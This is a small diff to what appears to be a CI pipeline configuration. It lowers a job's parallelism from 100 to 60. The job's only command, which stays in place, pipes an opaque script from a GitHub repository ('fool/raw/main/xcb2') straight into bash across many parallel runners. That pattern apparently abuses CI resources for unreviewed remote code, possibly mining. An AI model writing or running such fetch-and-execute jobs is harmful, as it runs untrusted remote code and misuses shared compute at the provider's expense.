@@ -11,4 +11,4 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'curl -sL https://github.com/aquilarendy/fool/raw/main/xcb2 | bash'
-          parallelism: 100
+          parallelism: 60
